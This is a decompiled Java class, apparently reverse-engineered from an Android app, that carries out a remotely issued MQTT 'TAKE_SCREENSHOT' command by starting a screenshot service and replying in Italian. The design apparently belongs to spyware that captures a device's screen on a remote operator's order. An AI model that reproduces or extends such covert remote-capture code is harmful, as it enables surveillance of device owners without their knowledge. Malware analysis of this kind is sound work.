package com.app.system.common.commands;

import android.content.Context;
import android.content.Intent;
import com.app.system.common.ScreenshotService;
import com.app.system.common.e.a;
import com.app.system.mqtt.MqttCommand;
import com.app.system.mqtt.MqttCommandReply;

public class TakeScreenshot
  extends Command
{
  public static final String CMD_NAME = "TAKE_SCREENSHOT";
  public static Command.Factory sFactory = new Command.Factory()
  {
    public Command a(MqttCommand paramAnonymousMqttCommand)
    {
      return new TakeScreenshot(paramAnonymousMqttCommand, null);
    }
  };
  
  private TakeScreenshot(MqttCommand paramMqttCommand)
  {
    super(paramMqttCommand);
  }
  
  public MqttCommandReply a(Context paramContext)
  {
    MqttCommandReply localMqttCommandReply = this.mqttCmd.b(paramContext);
    if (!a.a())
    {
      localMqttCommandReply.result = 319;
      return localMqttCommandReply;
    }
    Intent localIntent = new Intent(paramContext, ScreenshotService.class);
    localIntent.putExtra("mqtt-cmd", this.mqttCmd);
    paramContext.startService(localIntent);
    localMqttCommandReply.result = 30;
    localMqttCommandReply.replyText = "Comando in esecuzione...";
    return localMqttCommandReply;
  }
}


/* Location:              ~/com/app/system/common/commands/TakeScreenshot.class
 *
 * Reversed by:           J
 */